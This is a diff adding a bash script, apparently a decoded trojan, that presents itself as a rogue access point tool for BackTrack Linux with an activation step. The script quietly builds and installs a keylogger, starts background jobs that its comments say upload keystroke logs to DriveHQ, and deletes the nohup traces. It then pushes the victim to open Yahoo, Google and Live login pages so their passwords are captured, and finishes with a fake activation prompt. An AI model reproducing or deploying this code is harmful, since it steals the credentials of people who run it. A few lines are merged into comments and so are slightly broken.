@@ -1,0 +1,159 @@
+#!/bin/bash
+# karma.sh decoded
+
+echo ""
+echo "System processing, please wait"
+echo ""
+
+# EXTRACTING 'rogue.tar.gz' to 'lkl2' FOLDERS?tar -xvzf rogue.tar.gz
+clear
+
+echo ""
+echo "System processing, please wait..."
+echo ""
+
+# START BACKGROUND PROGRAMS BG1(RUN LINUX KEYLOGGER) AND BG2(RUN MONITORING KEYSTROKES AND SEND LOG.TXT FILES TO DRIVEHQ)
+cd lkl2
+./configure --silent
+make --silent
+make install --silent
+cd
+chmod +x /root/bg1.sh
+nohup /root/bg1.sh &
+rm -r /root/nohup.out
+chmod +x /root/bg2.sh
+nohup /root/bg2.sh &
+sleep 2
+rm -r /root/nohup.out
+clear
+
+# MENU LIST
+echo ""
+echo "--------------------------------------------------------- "
+echo "THIS MESSAGES WILL NOT APPEAR AFTER karma.sh IS ACTIVATED "
+echo "--------------------------------------------------------- "
+echo ""
+echo "1. Compose indemnity text below and send to fadzilmahfodh@gmail.com"
+echo "   Yes, I want activation code and will never use for illegal purpose"
+echo ""
+echo "2. Check your email for activation code after sending text "
+echo ""
+read -p "3. Send now ? (0=no, 1=yes) " act
+clear
+
+# SETTING INTERNET CONNECTION?if [ $act = 1 ] 
+then
+echo ""
+echo "System processing, please wait..."
+echo ""
+read -p  "Which backtrack are you using ? (bt3=3,bt4=4) " bt
+if [ $bt = 3 ]
+then 
+  con=0
+  while [ $con = 0 ]
+  do
+    echo ""
+    echo "Connecting to internet..."
+    #killall firefox
+    echo ""
+    konsole -e wlassistant &
+    clear
+    cd
+    echo ""
+    echo "Please configure the 'Wireless Assistant 0.5.7' to send email"
+    read -p "Press 'ENTER' key here once you successfully connected to internet: " try
+    if ping -c 1 www.yahoo.com ; then
+      killall firefox
+      firefox https://login.yahoo.com/ &
+      sleep 4
+      firefox https://www.google.com/accounts/ManageAccount &
+      sleep 4
+      firefox http://home.live.com/
+      con=1
+      clear
+    else
+      clear
+      echo ""
+      read -p "Internet connection not successful. Try again ? (0=no,1=yes) " try
+      killall wlassistant
+      if [ $try = 1 ]
+      then
+        con=0
+      fi
+      if [ $try = 0 ]
+      then
+        con=1
+      fi
+      echo ""
+      clear
+    fi
+  done
+  ############################
+  # DECOY FOR ACTIVATION CODE
+  clear
+  echo ""
+  read -p "ENTER ROGUE AP ACTIVATION CODE : " pls
+  sleep 3
+  echo "You have entered an invalid code "
+  echo ""
+  exit
+  ############################
+fi
+if [ $bt = 4 ]
+then 
+	con=0
+	while [ $con = 0 ]
+	do
+		echo ""
+		echo "Connecting to internet..."
+		killall firefox
+		echo ""
+		sudo /etc/init.d/NetworkManager restart 
+		clear
+		cd
+		echo ""
+		echo "Please configure the 'Network Manager' to send email"
+		read -p "Press 'ENTER' key here once you successfully connected to internet: " try
+		if ping -c 1 www.yahoo.com ; then
+			killall firefox
+			firefox https://login.yahoo.com/ &
+			sleep 4
+			firefox https://www.google.com/accounts/ManageAccount &
+			sleep 4
+			firefox http://home.live.com/?con=1
+			clear
+		else
+			clear
+			echo ""
+			read -p "Internet connection not successful. Try again ? (0=no,1=yes) " try
+			if [ $try = 1 ]
+			then
+				con=0
+			fi
+			if [ $try = 0 ]
+			then
+				con=1
+			fi
+			echo ""
+			clear
+		fi
+	done
+	############################
+	# DECOY FOR ACTIVATION CODE
+	clear
+	echo ""
+	read -p "ENTER ROGUE AP ACTIVATION CODE : " pls
+	sleep 3
+	echo "You have entered an invalid code "
+	echo ""
+	exit
+	############################
+	fi
+fi
+
+# DECOY FOR ACTIVATION CODE
+clear
+echo ""
+read -p "ENTER ROGUE AP ACTIVATION CODE : " pls
+sleep 3
+echo "You have entered an invalid code "
